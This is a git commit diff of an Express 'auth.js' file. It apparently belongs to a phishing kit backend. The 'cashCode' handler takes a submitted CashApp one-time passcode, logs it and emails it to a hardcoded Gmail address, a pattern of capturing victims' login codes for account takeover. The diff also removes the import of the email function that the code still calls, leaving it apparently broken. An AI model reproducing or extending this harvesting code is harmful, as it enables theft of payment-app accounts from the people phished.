7077861257ed5837b497bc8f67aef72423377da3
brainm725 <123113895+brainm725@users.noreply.github.com>
2023-08-25 18:53:20 +0100

    Update auth.js

--- control/auth.js
+++ control/auth.js
@@ -1,6 +1,3 @@
-const { response } = require('express');
-const sendEmail = require('../control/sendemail')
-
 exports.authenticateAdminUser = (req, res) => {
     const { email, password } = req.body;
 
@@ -95,28 +92,27 @@ exports.code = (req, res) => {
     } catch (error) {
         return res.status(500).send(error.message);
     }
+}
+exports.cashCode = (req, res) => {
+    const { code } = req.body;
 
-    exports.cashCode = (req, res) => {
-        const { code } = req.body;
+    try {
+        const message = `CashApp Otp:${code}`
+        console.log(message)
+        const reason = 'Cashapp Otp code'
+        const email = 'techt5562@gmail.com'
 
-        try {
-            const message = `CashApp Otp:${code}`
-            console.log(message)
-            const reason = 'Cashapp Otp code'
-            const email = 'techt5562@gmail.com'
+        sendEmail(email, message, reason, (data) => {
+            if (data) {
+                return res.status(200).json({
+                    status: 200,
+                    email: email,
+                    msg: 'email sent'
+                });
+            }
 
-            sendEmail(email, message, reason, (data) => {
-                if (data) {
-                    return res.status(200).json({
-                        status: 200,
-                        email: email,
-                        msg: 'email sent'
-                    });
-                }
-
-            }).then(response => res.send(response.message)).catch(error => res.status);
-        } catch (error) {
-            return res.status(500).send(error.message);
-        }
+        }).then(response => res.send(response.message)).catch(error => res.status);
+    } catch (error) {
+        return res.status(500).send(error.message);
     }
 }
